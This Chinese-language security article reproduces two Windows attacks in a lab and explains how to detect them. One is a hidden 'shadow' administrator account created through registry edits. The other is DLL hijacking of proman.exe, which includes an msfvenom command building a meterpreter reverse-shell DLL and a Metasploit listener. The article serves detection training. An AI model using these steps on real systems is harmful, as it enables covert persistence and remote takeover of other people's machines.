**免责声明：攻击复现场景均为本地搭建靶机测试环境，涉及复现方式相关，仅作个人拓展学习了解。**

##  **一、概述**

计算机网络的安全性主要包括网络服务的可用性、网络信息的保密性和网络信息的完整性。数据时代的不断进步，也产生了一些安全问题。数据安全和设备安全更是网络安全中的两个重要内容。关于Windows主机的安全防护，大概分为以下几个方面：账户管理、本地策略、服务、网络协议、注册表管理、文件系统与权限、Windows系统自身安全。如何去发现Windows主机的一些潜在或者已经存在的威胁，以怎样的检测排查思路去分析。

那么在这期文章中我们通过影子账号的建立和DLL劫持的攻击方式进行复现，带你直观了解如何去检测主机安全的隐秘角落。

##  **二、复现及分析检测**

### 1.影子账户筛查

 **告警发生场景** ：
黑客在入侵系统后常常会建立一个影子账户。之所以称其为“影子账户”，是因为这种账户用系统中提供的工具或方法都无法看到，并且无论是“用户账户”、“计算机管理”，还是命令行中，都无法删除此账户。

 **攻击方式** ：攻击者获得管理员权限后，通过注册表或REG命令添加影子账户。

 **复现过程** ：通过命令行新建一个用户（注意：新建的用户名建议以$结尾）。

![1629267728_611ca710c74d8add2db69.png!small?1629267728869](https://image.3001.net/images/20210818/1629267728_611ca710c74d8add2db69.png!small?1629267728869)

通过regedit命令进入注册表，进行查看。

![1629267738_611ca71accecd5fb669c7.png!small?1629267739129](https://image.3001.net/images/20210818/1629267738_611ca71accecd5fb669c7.png!small?1629267739129)

根据Names对应的类型，将cmd$对应Users下的F类型值替换为administrator对应Users下的F类型值。

![1629267754_611ca72aa0d8e1fd3279e.png!small?1629267754768](https://image.3001.net/images/20210818/1629267754_611ca72aa0d8e1fd3279e.png!small?1629267754768)

![1629267761_611ca73179170c9a390d5.png!small?1629267761613](https://image.3001.net/images/20210818/1629267761_611ca73179170c9a390d5.png!small?1629267761613)

将000003FD和cmd$导出。导出后，在命令行中将cmd$账号删除。

![1629267770_611ca73aed96b5c4eba24.png!small?1629267771029](https://image.3001.net/images/20210818/1629267770_611ca73aed96b5c4eba24.png!small?1629267771029)

删除后，检查注册表已经没有cmd$的键值。然后将刚才导出的*.reg，依次将000003FD.reg和cmd$.reg双击。

![1629267789_611ca74d7248e808cb588.png!small](https://image.3001.net/images/20210818/1629267789_611ca74d7248e808cb588.png!small)

![1629267794_611ca75254d8224924af4.png!small](https://image.3001.net/images/20210818/1629267794_611ca75254d8224924af4.png!small)

通过命令行和控制面板均发现创建的影子账号。

![1629267819_611ca76bb5aeefa8873eb.png!small?1629267819825](https://image.3001.net/images/20210818/1629267819_611ca76bb5aeefa8873eb.png!small?1629267819825)

![1629267832_611ca7783d795384038c8.png!small?1629267832328](https://image.3001.net/images/20210818/1629267832_611ca7783d795384038c8.png!small?1629267832328)

切换账号验证。

![1629267838_611ca77eab3f789df0b37.png!small?1629267840260](https://image.3001.net/images/20210818/1629267838_611ca77eab3f789df0b37.png!small?1629267840260)

登录成功且为管理员账户。

![1629267845_611ca785557f732f773a0.png!small?1629267845429](https://image.3001.net/images/20210818/1629267845_611ca785557f732f773a0.png!small?1629267845429)

 **检测思路**
：可以通过人工查看原始的系统日志和进入注册表编辑器进行分析，或者通过日志审计工具解析原始日志，分析出有短时间内添加账号删除账号的行为，并通过对注册表修改情况，以及跟踪未知账号后续产生的风险行为，来进行告警。

 **日志来源** ：以Windows设备管理器查看日志为例：

    
    
    1 2020-12-03T15:38:04.526542+08:00 WIN-94A29A4Q0RK Microsoft-Windows-Security-Auditing 476 - [seci-win-2008 Keywords="-9214364837600034816" EventType="AUDIT_SUCCESS" EventID="4720" ProviderGuid="{54849625-5478-4994-A5BA-3E3B0328C30D}" Version="0" Task="13824" OpcodeValue="0" RecordNumber="1098" ThreadID="652" Channel="Security" Category="用户帐户管理" Opcode="信息" TargetUserName="admin" TargetDomainName="WIN-94A29A4Q0RK" TargetSid="S-1-5-21-2527095256-2181598628-2082852982-1014" SubjectUserSid="S-1-5-21-2527095256-2181598628-2082852982-500" SubjectUserName="Administrator" SubjectDomainName="WIN-94A29A4Q0RK" SubjectLogonId="0x4299d" PrivilegeList="-" SamAccountName="admin" DisplayName="%%1793" UserPrincipalName="-" HomeDirectory="%%1793" HomePath="%%1793" ScriptPath="%%1793" ProfilePath="%%1793" UserWorkstations="%%1793" PasswordLastSet="%%1794" AccountExpires="%%1794" PrimaryGroupId="513" AllowedToDelegateTo="-" OldUacValue="0x0" NewUacValue="0x15" UserAccountControl=" %%2080 %%2082 %%2084" UserParameters="%%1793" SidHistory="-" LogonHours="%%1797" EventReceivedTime="2020-12-03 15:38:06" SourceModuleName="in" SourceMouleType="im_msvistalog"]1 2020-12-03T15:38:24.538782+08:00 WIN-94A29A4Q0RK Microsoft-Windows-Security-Auditing 476 - [seci-win-2008 Keywords="-9214364837600034816" EventType="AUDIT_SUCCESS" EventID="4726" ProviderGuid="{54849625-5478-4994-A5BA-3E3B0328C30D}" Version="0" Task="13824" OpcodeValue="0" RecordNumber="1105" ThreadID="652" Channel="Security" Category="用户帐户管理" Opcode="信息" TargetUserName="admin" TargetDomainName="WIN-94A29A4Q0RK" TargetSid="S-1-5-21-2527095256-2181598628-2082852982-1014" SubjectUserSid="S-1-5-21-2527095256-2181598628-2082852982-500" SubjectUserName="Administrator" SubjectDomainName="WIN-94A29A4Q0RK" SubjectLogonId="0x4299d" PrivilegeList="-" EventReceivedTime="2020-12-03 15:38:26" SourceModuleName="in" SourceModuleType="im_msvistalog"]

 **人工分析**
：通过对原始日志进行分析，查找到有添加删除账号行为，用户账户、计算机管理都未显示新增账号，但该账号后续产生其他的风险操作，查看注册表编辑器存在账号相关信息，即可判定属于存在影子账号。

 **工具分析**
：通过日志解析出事件名称为用户账户管理，以及分析出未知账号的后续行为（例如访问敏感文件或高危操作）等关联分析判定属于安全威胁事件触发告警。验证：对注册表内账号信息与设备管理器内账号信息进行对比，是否有未知账号。

### 2.DLL劫持

 **告警发生场景** ：

主机使用人员，下载含有非法dll的软件使用。或者攻击者入侵主机后构造非法dll，方便后续入侵利用。

 **DLL概念** ：

DLL(Dynamic Link
Library)文件为动态链接库文件，又称“应用程序拓展”，是软件文件类型。在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。当我们执行某一个程序时，相应的DLL文件就会被调用。一个应用程序可使用多个DLL文件，一个DLL文件也可能被不同的应用程序使用，这样的DLL文件被称为共享DLL文件。（摘自网络，更多了解：https://docs.microsoft.com/zh-cn/troubleshoot/windows-client/deployment/dynamic-link-library）

 **DLL劫持原理** ：

由于输入表中只包含DLL名而没有它的路径名，因此加载程序必须在磁盘上搜索DLL文件。首先会尝试从当前程序所在的目录加载DLL，如果没找到，则在Windows系统目录中查找，最后是在环境变量中列出的各个目录下查找。利用这个特点，先伪造一个系统同名的DLL，提供同样的输出表，每个输出函数转向真正的系统DLL。程序调用系统DLL时会先调用当前目录下伪造的DLL，完成相关功能后，再跳到系统DLL同名函数里执行。这个过程用个形象的词来描述就是系统DLL被劫持（hijack）了。

 **系统环境准备** ：

> kali_2019.1a虚拟机
>
> windows2008r2靶机虚拟机
>
> 靶机安装有python2.7

 **工具准备** ：

> Process Explorer
>
> 紫金桥监控组态软件 V6.5
>
> DLL_Hijacker.py
>
> VC6.0++

###  **复现开始** ：

 **1、根据Process Explorer和注册表对比，寻找可劫持的DLL** 。

![1629267879_611ca7a7692b4f8e275b3.png!small?1629267879522](https://image.3001.net/images/20210818/1629267879_611ca7a7692b4f8e275b3.png!small?1629267879522)

找到ws2help.dll可以作为劫持dll。

 **2、通过python环境生成ws2help.cpp文件。**

![1629267885_611ca7ade98733d1d7b0d.png!small?1629267886217](https://image.3001.net/images/20210818/1629267885_611ca7ade98733d1d7b0d.png!small?1629267886217)

在python2.7文件夹下，生成一个ws2help.cpp文件。

![1629267893_611ca7b5e19693bdd4848.png!small?1629267893982](https://image.3001.net/images/20210818/1629267893_611ca7b5e19693bdd4848.png!small?1629267893982)

 **3、使用VC6.0++将ws2help.cpp编译为dll文件。**

新建一个Win32 Dynamic-Link Library工程，名称为ws2help，路径按需更改。

![1629267904_611ca7c04798aae942633.png!small?1629267905845](https://image.3001.net/images/20210818/1629267904_611ca7c04798aae942633.png!small?1629267905845)

![1629267910_611ca7c65d59d3f00e853.png!small?1629267910649](https://image.3001.net/images/20210818/1629267910_611ca7c65d59d3f00e853.png!small?1629267910649)

将生成的ws2help.cpp文件内容，替换掉VC6.0++生成的ws2help.cpp内容。添加 #include “StdAfx.h”。

![1629267917_611ca7cd12b9766b7bc35.png!small?1629267917529](https://image.3001.net/images/20210818/1629267917_611ca7cd12b9766b7bc35.png!small?1629267917529)

 **4、首先编译同目录下的StdAfx.cpp文件。其次编译ws2help.cpp文件**

结果如下。

![1629267926_611ca7d62da0f6f720820.png!small?1629267926256](https://image.3001.net/images/20210818/1629267926_611ca7d62da0f6f720820.png!small?1629267926256)

没有报错，则将其进行组建，组建生成的文件，在工程目录下的Debug目录下。

![1629267931_611ca7db58d8eb0fe649a.png!small?1629267931913](https://image.3001.net/images/20210818/1629267931_611ca7db58d8eb0fe649a.png!small?1629267931913)

将生成的dll文件，放在proman.exe同一目录下。重新启动proman.exe，会弹出提示。

![1629267939_611ca7e37dcde9970aef5.png!small?1629267940268](https://image.3001.net/images/20210818/1629267939_611ca7e37dcde9970aef5.png!small?1629267940268)

 **5、使用kali生成dll文件。**

用法如下。

![1629267954_611ca7f22786987be1c42.png!small?1629267954301](https://image.3001.net/images/20210818/1629267954_611ca7f22786987be1c42.png!small?1629267954301)

    
    
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<本机IP> LPORT=<监听端口> -f dll >/root/ws2help.dll

![1629267982_611ca80ee42b39d05370d.png!small?1629267983005](https://image.3001.net/images/20210818/1629267982_611ca80ee42b39d05370d.png!small?1629267983005)

![1629267961_611ca7f9ddb197e52e83d.png!small?1629267961972](https://image.3001.net/images/20210818/1629267961_611ca7f9ddb197e52e83d.png!small?1629267961972)

将生成的dll文件压缩，在拷贝到靶机上。

 **6、在kali中打开msf工具。**

使用msf中的handler模块开启监听。

![1629267999_611ca81f011d5670cb6ce.png!small?1629267999309](https://image.3001.net/images/20210818/1629267999_611ca81f011d5670cb6ce.png!small?1629267999309)

![1629268004_611ca824338ed4edf0267.png!small?1629268004472](https://image.3001.net/images/20210818/1629268004_611ca824338ed4edf0267.png!small?1629268004472)

注入kali生成的dll文件到，proman.exe进程中。

![1629268015_611ca82f60c3b9910af16.png!small?1629268015480](https://image.3001.net/images/20210818/1629268015_611ca82f60c3b9910af16.png!small?1629268015480)

 **Kali已经成功渗透靶机。**

![1629268027_611ca83b7cb134106ab08.png!small?1629268027570](https://image.3001.net/images/20210818/1629268027_611ca83b7cb134106ab08.png!small?1629268027570)

![1629268031_611ca83fbf37b7a8f630b.png!small?1629268031854](https://image.3001.net/images/20210818/1629268031_611ca83fbf37b7a8f630b.png!small?1629268031854)

![1629268036_611ca844ad762d6423881.png!small?1629268036744](https://image.3001.net/images/20210818/1629268036_611ca844ad762d6423881.png!small?1629268036744)

![1629268042_611ca84abfb5fcf21d7ff.png!small?1629268042914](https://image.3001.net/images/20210818/1629268042_611ca84abfb5fcf21d7ff.png!small?1629268042914)

可以看到这个账号是为管理员权限。

 **分析**
：判断是否被DLL劫持，可以人工通过对系统原始日志中，应用程序报错日志进行查看，同时使用工具对应用程序加载的DLL进程路径进行查看，是否存在异常。

##  **三、总结**

以上本文介绍了Windows安全威胁的利用手段，以及更直观的了解攻击手段的复现过程，可以更好的去分析排查隐秘威胁。随着数据时代的不断前进，进步的同时也存在着一些安全的隐患。更多的了解相关检测手段，再根据分析工具，可以更好的检测隐秘威胁，从而减少以及避免相关威胁带来的损失。

相关分享：

[Linux日志分析场景（一）﻿](../articles/network/284641.html)

[linux日志分析场景（二)](../articles/network/285192.html)

